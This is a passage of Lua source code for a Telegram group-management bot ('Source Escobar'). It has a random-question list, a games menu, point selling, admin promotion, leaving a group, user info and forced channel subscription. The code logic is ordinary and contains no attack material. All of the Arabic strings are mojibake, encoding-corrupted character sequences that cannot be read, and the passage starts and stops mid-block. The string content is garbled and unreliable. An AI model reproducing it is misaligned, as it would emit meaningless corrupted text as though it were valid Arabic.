Ψ¨ΨͺΨ΄ΨͺΨ±ΩΩΨ§Ψ','ΩΨ΄ Ψ§ΨΊΨ¨Ω Ψ΄ΩΨ‘ Ψ³ΩΩΨͺΩ Ψ','Ψ΄ΩΨ‘ ΩΩ Ψ΅ΨΊΨ±Ω ΩΨ§ΨͺΨΊΩΨ± ΩΩΩΩ°ΩΨ','ΩΨ΄ ΩΩΨΉ Ψ§ΩΨ£ΩΩΨ§Ω Ψ§ΩΩΩ ΨͺΨ­Ψ¨ ΨͺΨͺΨ§Ψ¨ΨΉΩΨ','ΩΨ΄ ΩΩΨΉ Ψ§ΩΨ£ΩΩΨ§Ω Ψ§ΩΩΩ ΨͺΨ­Ψ¨ ΨͺΨͺΨ§Ψ¨ΨΉΩΨ','ΨͺΨ¬Ψ§ΩΩ Ψ§Ψ­Ψ― ΨΉΩΩ Ψ­Ψ³Ψ§Ψ¨ ΩΨ΅ΩΨ­ΨͺΩ Ψ','ΨͺΨͺΩΨ¨Ω Ψ§ΩΩΨ΅ΩΨ­Ψ© ΩΩ Ψ§Ω Ψ΄Ψ?Ψ΅Ψ','ΩΩΩΩ ΩΨ§Ψ³ΩΩ ΩΨΉΩ Ψ§ΩΩΨͺΨ±Ψ© ΩΨ°Ω Ψ','ΩΨͺΩ ΩΨ§Ψ²Ω ΨͺΩΩΩ ΩΨ§ Ψ','Ψ§ΩΨ«Ψ± Ψ΄ΩΨ‘ ΨͺΨ­Ψ³ Ψ§ΩΩ ΩΨ§Ψͺ Ω ΩΨ¬ΨͺΩΨΉΩΨ§Ψ','ΨͺΨ€ΩΩ Ψ§Ω ΩΩΩΩ° "Ψ­ΩΨ¨ ΩΩ Ψ£ΩΩ ΩΨΈΨ±Ψ©" ΩΩΨ§ ΩΨ§ Ψ.','ΨͺΨ€ΩΩ Ψ§Ω ΩΩΩΩ° "Ψ­ΩΨ¨ ΩΩ Ψ£ΩΩ ΩΨΈΨ±Ψ©" ΩΩΨ§ ΩΨ§ Ψ.','ΩΩ ΨͺΨΉΨͺΩΨ― Ψ£Ω ΩΩΩΨ’ΩΩ ΩΩ ΩΨ±Ψ§ΩΨ¨Ω Ψ¨Ψ΄ΨΊΩΨ','Ψ§Ψ΄ΩΨ§Ψ‘ Ψ§Ψ°Ψ§ Ψ³ΩΩΨͺΩΨ§ ΩΨ΄Ψ?Ψ΅ ΨͺΨ―Ω ΨΉΩΩ Ψ§ΩΩ ΨͺΨ­Ψ¨Ω ΩΨ«ΩΨ± Ψ','Ψ§Ψ΄ΩΨ§Ψ‘ Ψ΅ΨΉΨ¨ ΨͺΨͺΩΨ¨ΩΩΨ§ Ψ¨Ψ³Ψ±ΨΉΩ Ψ','Ψ§ΩΨͺΨ¨Ψ§Ψ³ ΩΨ·ΩΩΨ','Ψ£ΩΨ«Ψ± Ψ¬ΩΩΨ© Ψ£Ψ«Ψ±Ψͺ Ψ¨Ω ΩΩΩΩ° Ψ­ΩΨ§ΨͺΩΨ','ΨΉΩΨ―Ω ΩΩΨ¨ΩΨ§ ΩΩ Ψ΄ΩΨ‘ Ψ.',
'Ψ§ΩΨ«Ψ± ΩΩΩΩΩ ΨͺΨ­Ψ¨ΩΩ ΩΨΉ Ψ¨ΨΉΨΆΨ','Ψ£Ψ¬ΩΩ Ψ¨ΩΨͺ Ψ΄ΨΉΨ± Ψ³ΩΨΉΨͺΩ ...','Ψ³Ψ¨Ω ΩΨ±Ψ§ΩΨ―Ω Ψ΄ΨΉΩΨ± Ψ£ΩΩ ΩΩ ΨͺΨΉΨ― ΨͺΨΉΨ±Ω ΩΩΨ³ΩΨ','ΨͺΨͺΩΩΨΉ ΩΩΩΩ°Ω Ψ§Ψ­Ψ― Ψ­Ψ§ΩΨ― ΨΉΩΩΩ ΩΩΩΨ±ΩΩ Ψ','Ψ£Ψ¬ΩΩ Ψ³ΩΨ© ΩΩΩΨ§Ψ―ΩΨ© ΩΨ±Ψͺ ΨΉΩΩΩ Ψ','ΩΩ ΩΨ²ΨΉΨͺ/Ω ΩΨ΅Ψ―ΩΩ/Ω ΩΩΨ§ΩΩ ΩΨ§ΩΩ Ψ―Ψ?Ω ΩΨ΄ Ψ¨ΨͺΨ³ΩΩ/ΩΩΨ','ΩΨ΄ ΨͺΨ­Ψ³ Ψ§ΩΩ ΨͺΨ­ΨͺΨ§Ψ¬ Ψ§ΩΩΨͺΨ±Ψ© ΩΨ§Ψ°Ω Ψ','ΩΩΩΩ ΨΆΨ§ΨΉ ΨΉΩΩΨ','@ΩΩΨ΄Ω .. Ψ΄Ψ?Ψ΅ ΨͺΨ?Ψ§Ω ΩΩΩ Ψ§Ψ°Ψ§ ΨΉΨ΅Ψ¨ ...','ΩΩΩΩ°ΩΩ ΨΉΨ§ΩΩ ΩΩΩΩ° Ψ°ΩΩΩ ΩΨ§ ΨͺΩΨ³Ψ§Ω ΩΩΩ Ψ±ΩΨΉΨͺΩΨ','ΨͺΨ?ΨͺΨ§Ψ± Ψ£Ω ΨͺΩΩΩ ΨΊΨ¨Ω Ψ£Ω ΩΨ¨ΩΨ­Ψ','Ψ§ΩΩΩΩΨ³ Ψ§Ω Ψ§ΩΨ­Ψ¨ Ψ','Ψ£Ψ¬ΩΩ Ψ¨ΩΨ― ΩΩΩΩ° ΩΨ§Ψ±Ψ© Ψ’Ψ³ΩΨ§ Ψ¨ΩΨΈΨ±ΩΨ','ΩΨ§ Ψ§ΩΨ°Ω ΩΨ΄ΨΊΩ Ψ¨Ψ§ΩΩ ΩΩΩΩ° Ψ§ΩΩΨͺΨ±Ψ© Ψ§ΩΨ­Ψ§ΩΩΨ©Ψ','Ψ§Ψ­ΩΨ± Ψ§ΩΩΨ§Ψ³ ΩΩ ΩΩ ...','ΩΩΩ ΩΩΩΩ Ψ§ΩΨ³ΨΉΨ§Ψ―Ω Ψ¨Ψ±Ψ§ΩΩΨ','Ψ§Ψ΄ΩΨ§Ψ‘ ΨͺΩΨͺΨ?Ψ± Ψ§ΩΩ Ω Ψ³ΩΩΨͺΩΨ§ Ψ','ΨͺΨ²ΨΉΩΩ Ψ§ΩΨ―ΩΩΨ§ ΩΩΨ±ΨΆΩΩ Ψ','ΩΨ΄ Ψ§ΩΨ­Ψ¨ Ψ¨ΩΨΈΨ±ΩΨ','Ψ§ΩΨΆΩ ΩΨ―ΩΩ ΩΩΩΩ ΨͺΩΨ§Ψ³Ψ¨ΩΨ','ΩΩ ΩΩΩΩ° Ψ­Ψ³Ψ§Ψ¨Ω Ψ§ΩΨ¨ΩΩΩ Ψ','ΩΩΩΨ© ΩΨ΄Ψ?Ψ΅ Ψ£Ψ³ΨΉΨ―Ω Ψ±ΨΊΩ Ψ­Ψ²ΩΩ ΩΩΩΩ° ΩΩΩΩ ΩΩ Ψ§ΩΨ£ΩΨ§Ω Ψ','ΨΉΩΨ±Ω Ψ§ΩΨͺΩΩΨͺ ΩΩ Ψ£Ψ­Ψ― Ψ!','ΩΨ§ Ψ§ΩΨ³ΩΨ‘ ΩΩΩΩ° ΩΨ°Ω Ψ§ΩΨ­ΩΨ§Ψ© Ψ','ΨΊΩΩΨ© ΨΉΩΨ―Ω ΩΨΉΨ§ΩΨ§ Ψ°ΩΨ±ΩΨ§Ψͺπ΅π»','/','Ψ£ΩΨΆΩ Ψ΅ΩΨ© ΨͺΨ­Ψ¨Ω Ψ¨ΩΩΨ³ΩΨ','Ψ§ΩΨ«Ψ± ΩΩΨͺ ΨͺΨ­Ψ¨ ΨͺΩΨ§Ω ΩΩΩΩ°Ω ...','Ψ£Ψ·ΩΩ ΩΨ―Ψ© ΩΩΨͺ ΩΩΩΩ°ΩΨ§ ΩΩ Ψ³Ψ§ΨΉΨ©Ψ','Ψ£Ψ΅ΨΉΨ¨ ΩΨ±Ψ§Ψ± ΩΩΩΩ ΨͺΨͺΨ?Ψ°Ω Ψ','Ψ£ΩΨΆΩ Ψ΅ΩΨ© ΨͺΨ­Ψ¨Ω Ψ¨ΩΩΨ³ΩΨ','Ψ§ΩΨ«Ψ± ΩΩΨͺ ΨͺΨ­Ψ¨ ΨͺΩΨ§Ω ΩΩΩΩ°Ω ...','Ψ£ΩΨͺ ΩΨ­Ψ¨ΩΨ¨ Ψ¨ΩΩ Ψ§ΩΩΨ§Ψ³Ψ ΩΩΨ§ΩΨ±ΩΩΨ','Ψ₯Ψ­Ψ³Ψ§Ψ³Ω ΩΩΩΩ° ΩΨ§ΩΩΨ­ΨΈΨ©Ψ','Ψ§Ψ?Ψ± Ψ΄ΩΨ‘ Ψ§ΩΩΨͺΩ Ψ','ΨͺΨ΄ΩΩ Ψ§ΩΨΊΩΨ±Ω Ψ§ΩΨ§ΩΩΩ Ψ§Ω Ψ­Ψ¨Ψ','Ψ§Ψ°ΩΨ± ΩΩΩΩ ΩΨ§ΨͺΩΨ³Ψ§Ω Ψ¨ΨΉΩΨ±ΩΨ','Ψ§ΩΨ«Ψ± ΩΨ΄Ψ§ΩΩΩ Ψ¨Ψ³Ψ¨Ψ¨ Ψ','Ψ§ΩΩ ΩΨ§ΨͺΨ΅Ψ­Ω ΩΩ Ψ§ΩΩΩΩ ΩΩΩ ΨͺΩΩΩΩΨ','Ψ’Ψ?Ψ± ΩΨ±Ψ© ΨΆΨ­ΩΨͺ ΩΩ ΩΩ ΩΩΨ¨ΩΨ','ΩΩ Ψ§ΩΨ¬ΩΨ³ΩΨ© Ψ­Ψ³Ψ¨ ΩΩΨ§ΩΨ­Ω ΩΨ΄ Ψ¨ΨͺΩΩΩ Ψ¬ΩΨ³ΩΨͺΩΨ','Ψ§ΩΨ«Ψ± Ψ΄ΩΨ‘ ΩΨ±ΩΨΉ ΨΆΨΊΨ·Ω','Ψ§Ψ°ΩΨ± ΩΩΩΩ ΩΨ§ΨͺΩΨ³Ψ§Ω Ψ¨ΨΉΩΨ±ΩΨ','ΩΩ ΩΨ§ΩΩΨ§ ΩΩ  ΨͺΩΨ§ΩΩ Ψ΅ΩΩ ΩΨ§Ψ­Ψ― ΩΩΨ· ΩΩ Ψ§ΩΨ·ΨΉΨ§Ω ΩΩΨ―Ψ© Ψ΄ΩΨ± .',
'ΩΩΩ ΨͺΨ΄ΩΩ Ψ§ΩΨ¬ΩΩ Ψ°Ψ§Ψ','Ψ±Ψ―Ψ© ΩΨΉΩΩ ΩΩ ΩΨ²Ψ­ ΩΨΉΩ Ψ΄Ψ?Ψ΅ Ω ΨͺΨΉΨ±ΩΩ Ψ','Ψ§Ψ­ΩΨ± Ψ§ΩΩΨ§Ψ³ ΩΩ ΩΩ ...','ΨͺΨ­Ψ¨ Ψ§Ψ¨ΩΩ ΩΩΨ§ Ψ§ΩΩ','Ψ’Ψ?Ψ± ΩΩΩΩ°ΩΩ ΩΨ³ΩΨ³Ω ΩΨ§ΩΨͺΩΩΩΩπ₯Ψ','Ψ£ΩΨ¨Ψ­ Ψ§ΩΩΨ¨Ψ­ΩΩ ΩΩΩΩ° Ψ§ΩΨΉΩΨ§ΩΨ©: Ψ§ΩΨΊΨ―Ψ± Ψ£Ω Ψ§ΩΨ₯ΩΩΨ§Ωπ€·πΌΨ','ΩΩΩΨ© ΩΨ£ΩΨ±Ψ¨ Ψ΄Ψ?Ψ΅ ΩΩΩΨ¨Ωπ€Ψ','Ψ­Ψ·@ΩΩΨ΄Ω ΩΨ΄Ψ?Ψ΅ ΩΩΩΩΩ "Ψ­Ψ±ΩΨͺΩ ΩΨ§ΩΩΨ§ Ψ―Ψ§ΨΉΩ"πΌ!','Ψ§Ψ°Ψ§ Ψ¬Ψ§Ω Ψ?Ψ¨Ψ± ΩΩΨ±Ψ­ Ψ§ΩΩ ΩΨ’Ψ­ΩΪ ΨͺΨΉΩΩΩ ΩΩΩΩ°Ω ΩΩΩππ½Ψ','Ψ·Ψ¨ΨΉ ΩΩΩΩ ΩΨ?ΩΩΩ ΨͺΩΨ±Ω Ψ΄Ψ?Ψ΅ Ψ­ΨͺΩ ΩΩ ΩΩΨͺ ΨͺΩΨ­Ψ¨Ωππ»ββοΈΨ','Ψ§ΩΨΆΩ Ψ§ΩΨ§Ω Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ ΨΉΩΨ―ΩπΨ','ΩΩΩΩΩΩ Ψ§Ω Ψ§ΩΨ­ΩΨ§Ψ© Ψ―Ψ±ΩΨ³ Ψ ΩΨ§ΩΩ Ψ£ΩΩΩ Ψ―Ψ±Ψ³ ΨͺΨΉΩΩΨͺΩ ΩΩ Ψ§ΩΨ­ΩΨ§Ψ©πΨ','ΨͺΨ§Ψ±ΩΨ? ΩΩ ΨͺΩΨ³Ψ§ΩπΨ','ΨͺΨ­Ψ¨ Ψ§ΩΨ΅ΩΩ ΩΨ§ΩΨ§ Ψ§ΩΨ΄ΨͺΨ§Ψ‘βοΈβοΈΨ','Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨ ΨͺΨ³ΨͺΩΨ²ΩπΨ','Ψ΄ΩΩ ΩΩΨ§Ψ―ΩΩΩ ΩΨ§ΩΨͺ Ψ΅ΨΊΩΨ± (ΨΉΩΨ§Ψ±ΨͺΩ)πΌπ»Ψ','ΨΉΩΩ ΩΩΩΩΩ/Ψ¬ ΩΩΨ§ ΩΩΨ¨ ΩΨ­Ψ¨Ω/Ψ¬β€οΈΨ','Ψ§ΩΩ Ψ³ΩΨ±Ω ΩΩ ΩΩΩ Ψ±Ψ­ ΨͺΩΩΩβοΈΨ','ΩΩ ΨΉΨ―Ψ― Ψ§ΩΩΩ ΩΨΉΨ·ΩΩΩ Ψ¨ΩΩΩπΉΨ','ΩΩΨΉΩΨ© ΩΩ Ψ§ΩΨ£Ψ΄Ψ?Ψ§Ψ΅ ΨͺΨͺΨ¬ΩΨ¨ΩΩ ΩΩΩΩ° Ψ­ΩΨ§ΨͺΩβΨ','Ψ΄Ψ§Ψ±ΩΩΨ§ Ψ΅ΩΨ±Ψ© Ψ§Ω ΩΩΩΩ°Ψ―ΩΩ ΩΩ ΨͺΨ΅ΩΩΨ±ΩΨπΈ','ΩΩ ΩΩ ΨΉΨ΄Ψ±Ω ΨͺΨΉΨ·Ω Ψ­ΨΈΩπ©Ψ','Ψ§ΩΨ«Ψ± Ψ¨Ψ±ΩΨ§ΩΨ¬ ΨͺΩΨ§Ψ΅Ω Ψ§Ψ¬ΨͺΩΨ§ΨΉΩ ΨͺΨ­Ψ¨ΩπΨ','ΩΩ Ψ§Ω Ψ―ΩΩΩ Ψ§ΩΨͺπΨ','Ψ§ΩΨ«Ψ± Ψ―ΩΩΩ ΩΨ―Ω ΨͺΨ³Ψ§ΩΨ± ΩΩΨ§πΨ','ΩΩΩΩΨ© "ΩΩΨ¨Ψ± ΩΩΩΨ³Ω" ΩΩ ΨͺΨ€ΩΩ Ψ¨Ψ΅Ψ­ΨͺΩΨ§π§πΌΨ','ΨͺΨΉΨͺΩΨ― ΩΩΩΩ°Ω Ψ£Ψ­Ψ― ΩΨ±Ψ§ΩΨ¨Ωπ©πΌβπ»Ψ','ΩΩ Ψ¨ΩΨ―Ω ΨͺΨΊΩΨ± Ψ§ΩΨ²ΩΩ Ψ ΨͺΩΨ―ΩΩ ΩΩΨ§ ΨͺΨ±Ψ¬ΨΉΩπ°Ψ','ΩΨ΄Ψ±ΩΨ¨Ω Ψ§ΩΩΩΨΆΩπΉΨ','βΩΩ Ψ¨ΩΨ΅Ω Ψ’Ψ?Ψ± Ψ§ΩΨͺΨ¨Ψ§Ψ³ ΩΨ³Ψ?ΨͺΩΨπ­','ΩΩ ΩΨ²ΩΩ/Ψ¬ Ψ·ΩΩΩ/Ψ¬Ψπ','ΩΩ ΩΨ§Ω ΨΉΩΨ±Ω/Ψ¬ ΩΨ¨Ω Ω¨ Ψ³ΩΩΩπΨ','Ψ―ΩΩΩ ΩΨ―ΩΨͺ Ψ§ΩΩ Ψ³Ψ§ΩΨ±Ψͺ ΩΩΨ§πΨ','ΩΩ ΩΨ§ΩΩ ΩΩ Ω£ Ψ£ΩΩΩΨ§Ψͺ Ψ±Ψ§Ψ­ ΨͺΨͺΨ­ΩΩ ΨΉΨ§ΩΨ³Ψ±ΩΨΉ Ψ΄ΩΩ ΨͺΩΩΩπ§ββοΈΨ','β- ΩΨ³Ψ¨Ψ© Ψ§Ψ­ΨͺΩΨ§Ψ¬Ω ΩΩΨΉΨ²ΩΨ© ΩΩ 10πΨ','Ψ΄Ψ?Ψ΅ ΨͺΨ­Ψ¨Ω Ψ­ΨΈΨ±Ω Ψ¨Ψ―ΩΩ Ψ³Ψ¨Ψ¨ ΩΨ§ΨΆΨ­Ψ Ψ±Ψ―Ψ© ΩΨΉΩΩπ§Ψ','ΩΨ¨Ψ―Ψ£ ΩΩΩΩ° Ψ§ΩΨ­ΩΨ§Ψ© ΨͺΨΉΨͺΩΨ― ΨΉΩΩΩ Ψ―Ψ§Ψ¦ΩΨ§π―Ψ'
, }  
Dev_mfm(msg.chat_id_, msg.id_, 1, ''..mustafaTEAM[math.random(#mustafaTEAM)]..'' , 1, 'md')  
return false
end
end
--     Source Escobar     --
if text == 'Ψ§ΩΨ§ΩΨΉΨ§Ψ¨' and ChCheck(msg) or text == 'Ψ§ΩΨΉΨ§Ψ¨' and ChCheck(msg) or text == 'Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π?' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1,[[*
β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΨΉΨ§Ψ¨ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘
ββββ EB ββββ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ?ΩΩΩ β Ψ?ΩΩ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ§ΩΨ«ΩΩ β Ψ§ΩΨ«ΩΩ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨΉΩΨ³ β Ψ§ΩΨΉΩΨ³
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ§Ψ³Ψ¦ΩΩ β Ψ§Ψ³Ψ¦ΩΩ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ±ΩΩΩΨͺ β Ψ±ΩΩΩΨͺ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ­Ψ²ΩΨ±Ω β Ψ­Ψ²ΩΨ±Ω
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ±ΨͺΩΨ¨ β ΨͺΨ±ΨͺΩΨ¨
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΩΨΉΨ§ΩΩ β ΩΨΉΨ§ΩΩ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΩΩΨͺ β ΩΨͺ ΨͺΩΩΨͺ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΩΨ?ΨͺΩΩ β Ψ§ΩΩΨ?ΨͺΩΩ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ³ΩΨ§ΩΩΨ§Ψͺ β Ψ³ΩΨ§ΩΩΨ§Ψͺ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΩΨ­ΩΨ¨Ψ³ β Ψ§ΩΩΨ­ΩΨ¨Ψ³
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ±ΩΨ§ΨΆΩΨ§Ψͺ β Ψ±ΩΨ§ΨΆΩΨ§Ψͺ
β β« ΩΨΉΨ¨Ψ© Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ β Ψ§ΩΩΩΩΨ²ΩΩ
ββββ EB ββββ
β β« ΩΩΨ§Ψ·Ω β’ Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]], 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΩΨΉΩΨ·ΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
--     Source Escobar     --
if text == 'Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω' and ChCheck(msg) then
if tonumber((Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩ ΨͺΨ±Ψ¨Ψ­ Ψ§Ω ΩΩΨ·Ω\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΩΨΉΨ¨', 1, 'md')
else
Devmfm0 = (Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,Devmfm0)
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΨͺΩΩΩΩ Ψ¨ΩΨΉ '..(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' ΩΩ ΩΩΨ’Ψ·Ϊͺ\nβ β« ΩΩ ΩΩΨ·Ω ΨͺΨ³Ψ§ΩΩ 50 Ψ±Ψ³Ψ§ΩΩ', 'md')
Devmfm:del(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Escobar     --
if text == 'Ψ±ΩΨΉ Ψ§ΩΩΨ΄Ψ±ΩΩΩ' and ChCheck(msg) or text == 'Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,Manager_id)  
Devmfm:sadd(mustafa..'mfm:mfmConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ ΩΩΨͺΩ Ωΰ’ͺΩΨΉΩΩΫΩ\nβ β« ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ±ΩΨΉ '..num..' ΩΩ Ψ§ΩΨ§Ψ―ΩΩΩΩ \nβ β« ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end,nil) 
end
--     Source Escobar     --
if text == 'ΨΊΨ§Ψ―Ψ±' and SudoBot(msg) then
if Devmfm:get(mustafa.."mfm:Left:Bot"..mustafa) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "β β« Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω", 1, 'md')
return false  
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© \nβ β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ¨ΩΨ§ΩΨ§ΨͺΩΨ§ ', 1, 'md')
ChatLeave(msg.chat_id_, mustafa)
Devmfm:srem(mustafa.."mfm:Groups",msg.chat_id_)
end
--     Source Escobar     --
if text ==('ΩΩΩΨΉΩ') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'Ψ§ΩΩΩΨ΄Ψ¦'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'Ψ§ΩΨ§Ψ―ΩΩ'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'ΨΉΨΆΩΩΩΩ'
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨΉΩ β '..rtpa, 1, 'md')
end,nil)
end
--     Source Escobar     --
if text == "ΩΨΉΩΩΩΨ§ΨͺΩ" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'ΩΨ§ ΩΩΨ¬Ψ―' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§Ψ³ΩΩ β * β¨ ['..result.first_name_..'] β© π\n *β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β * β¨ ['..username..'] β© π\n *β β« Ψ’ΩΩ°ΪΩΪͺ β * β¨ `'..result.id_..'` β© π\n *β β« ΩΩΨ’Ψ·Ϊͺ β * β¨ '..user_nkt..' β© π\n *β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ '..user_msgs..' β© π\n *β β« Ψ¬ΩΨ§ΨͺΩ β * β¨ '..cont..' β© π\n *β β« ΨͺΩΩΨ’ΨΉΩΩΩΪͺ β * '..formsgs(msguser)..' π\n *β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β * '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source Escobar     --
if text == "ΨͺΨΉΩΩΩ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" or text == "ΨͺΨΊΩΩΨ± ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω" or text == "ΩΨΆΨΉ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Devmfm:setex(mustafa..'Devmfm4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, 'β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ ΩΨΉΨ±Ω ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ω')
end
return false  
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
if Devmfm:get(mustafa..'Devmfm2') then
local DevCh = Devmfm:get(mustafa..'Devmfm3')
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω ΩΩΨΉΩ \nβ β« ΨΉΩΩ Ψ§ΩΩΩΨ§Ψ© β ["..DevCh.."]")
else
Devmfm:setex(mustafa..'Devmfm4'..msg.sender_user_id_,360,true)
